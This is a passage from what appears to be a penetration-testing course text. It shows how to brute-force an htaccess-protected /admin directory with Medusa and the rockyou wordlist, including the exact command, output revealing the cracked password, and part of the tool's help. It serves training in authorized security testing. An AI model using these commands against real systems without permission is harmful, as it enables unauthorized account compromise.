format. This can only be determined by experimenting with each tool in a test environment and learning the strengths, weaknesses, and idiosyncrasies of each.

# 19.3.1 HTTP htaccess Attack with Medusa

According to its authors, Medusa is intended to be a "speedy, massively parallel, modular, login brute forcer".

We will use Medusa to attempt to gain access to an htaccess-protected web directory.

First, we will set up our target, an Apache webserver installed on our Windows client, which we will start through the XAMPP control panel. We will attempt to gain access to an htaccess-protected folder, /admin, on that server. Our wordlist of choice for this example will be /usr/share/wordlists/rockyou.txt.gz, which we must first decompress with gunzip:

```
```
kali@kali:~$ sudo gunzip /usr/share/wordlists/rockyou.txt.gz
...
```
```

*Listing 601 - Decompressing the rockyou wordlist*

Next, we will launch medusa and initiate the attack against the htaccess-protected URL (-m DIR;/admin) on our target host with -h 10.11.0.22. We will attack the admin user (-u admin) with passwords from our rockyou wordlist file (-P /usr/share/wordlists/rockyou.txt) and will, of course, use an HTTP authentication scheme (-M):

```
```
kali@kali:~$ medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http \
-m DIR;/admin
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / FooFus Networks <jmk@foofus.net>

ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: 123456 (1 of 14344391 com
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: 12345 (2 of 14344391 comp
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: 123456789 (3 of 14344391
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: password (4 of 14344391 c
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: iloveyou (5 of 14344391 c
...
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: samsung (255 of 14344391
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: freedom (256 of 14344391
ACCOUNT FOUND: [http] Host: 10.11.0.22 User: admin Password: freedom [SUCCESS]
...
```
```

*Listing 602 - HTTP htaccess attack using Medusa*

In this case, Medusa discovered a working password of "freedom".

Medusa has many additional options and settings, as shown in the help output in Listing 603:

```
```
kali@kali:~$ medusa
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / FooFus Networks <jmk@foofus.net>

ALERT: Host information must be supplied.

Syntax: Medusa [-h host] [-H file] [-u username] [-U file] [-p password] [-P file] [-C file]
-M module [OPT]
-h [TEXT] : Target hostname or IP address
-H [FILE] : File containing target hostnames or IP addresses
-u [TEXT] : Username to test
```
```